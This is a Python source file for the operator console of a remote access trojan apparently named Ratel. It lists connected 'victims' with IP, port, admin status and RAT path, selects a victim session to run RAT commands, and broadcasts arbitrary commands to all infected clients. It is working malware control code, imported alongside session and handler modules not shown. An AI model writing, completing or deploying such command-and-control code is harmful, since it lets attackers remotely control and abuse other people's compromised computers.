#from .handler import Handler
#from .session import Session
#from .management import Management
#from .management import CheckConn
#from .other import printColor



from colorama import Fore,Style
from prettytable import PrettyTable

from .handler import Handler
from .session import Session
from .management import Management
from .management import CheckConn
from .other import printColor


import time

class Menu:

    RESET_COLOR = Style.RESET_ALL
    def help(self):
        printColor("help","""
 -h or --help : Displays all server commands.

 -t X  or --target X : Selects a victim to be able to execute RAT commands. 
 Example: -t 10 | start session 10. Execute --list to list all sessions.

 -ls or --list : List all sessions connected to the server.

 -sa or --selectAll : Start a session with all targets.

 -cde or --connectionDisplayEnable : Activate the display of client information (Logoff and incoming connection).

 -cdd or --connectionDisplayDisable : Disables the display of client information (Logoff and incoming connection).
""")

    def changeStatusDisplay(self,true_or_false): 
        #this method enables or disables the display of connections on the terminal.
        Handler.status_connection_display= true_or_false
        if(true_or_false):
            printColor("information","[-] The connection display is active.\n")
        else:
            printColor("information","[-]The connection display is deactivated.\n")
    
    def printTarget(self):
        #Print all target.

        ptable = PrettyTable() #Ascii tables dynamic.
        ptable.field_names =["Session","IP","Port","Is he alive","Is he admin","Path RAT","Username"] #append title of row.
 
        for key in Handler.dict_conn.keys():
            ptable.add_row([key,Handler.dict_conn[key][1],Handler.dict_conn[key][2],Handler.dict_conn[key][3],Handler.dict_conn[key][4],Handler.dict_conn[key][5],Handler.dict_conn[key][6]])

        print(Fore.GREEN,(ptable),Fore.BLUE)

    def selectTarget(self,target):    
        #Select target.
        if(target in Handler.dict_conn.keys()):
            printColor("information","[+] Selected target: {}".format(Handler.dict_conn[target][1]))
            if(Handler.dict_conn[target][3]):
                session = Session(Handler.dict_conn[target][0],Handler.dict_conn[target][1],Handler.dict_conn[target][2],target) #def __init__(self,socket,ip_client,port_client,session_nb): 
                session.main() 
            else:
                printColor("information","[-] The target is currently offline.\n")
        else:
            printColor("information","[-] No target found. Please enter a valid target.\n")
    
    def selectAll(self):
        #Add to the start of the "MOD_ALL" command to tell the client to switch to MOD_ALL
        
        if len(Handler.dict_conn) != 0:
            printColor("help","[?] Execute -b or --back to return to sessions mode.\n") 
            while True:
                forall = str(input("AllTarget>"))
                if(forall == "--back" or forall == "-b"):
                    break
                for key in Handler.dict_conn.keys():
                    if(Handler.dict_conn[key][3]):
                        if CheckConn().safeSend(key,Handler.dict_conn[key][0],("MOD_ALL:"+forall).encode()):
                            printColor("information","[+] command sent to: {}:{}".format(Handler.dict_conn[key][1],Handler.dict_conn[key][1]))
                        else:
                            printColor("information","[+] The command could not be sent to: {}:{}".format(Handler.dict_conn[key][1],Handler.dict_conn[key][2]))
                    else:
                        pass
                print("\n")
        else:
            printColor("error","[+] No connection is enabled.\n")
        
        printColor("information", "[-] Back to menu\n")

    def main(self):
        
        
        if(Handler.status_connection_display):
            printColor("help","[?] By default, the connection display is active.To avoid being generated, you can deactivate it with the -cdd command.")
        
        printColor("help","[?] Run -h or --help to list the available commands.\n")
        while True:
            try:
                choice = str(input("RatelServer> ")).split()
            except ValueError:
                break

            printColor("help","[?] Command execute: {}\n".format(choice))
            for i in range(0,len(choice)):

                if(choice[i] == "--help" or choice[i] == "-h"):
                    self.help()

                elif(choice[i] == "-t" or choice[i] =="--target"):
                    try:
                        self.selectTarget(int(choice[i+1])) #int car -t 10 <- 10 doit ^etre un int 
                    except IndexError:
                        printColor("information","[-] No target found. Please enter a valid target.\n")
                        
                elif(choice[i] == "-ls" or choice[i] == "--list"):
                    self.printTarget()
                
                elif(choice[i]== "--connectionDisplayDisable" or choice[i] == "-cdd"):
                    self.changeStatusDisplay(False)
                
                elif(choice[i]=="--connectionDisplayEnable" or choice[i] == "-cde"):
                    self.changeStatusDisplay(True)
                
                elif(choice[i] == "--selectAll" or choice[i] == "-sa"):
                    self.selectAll()
                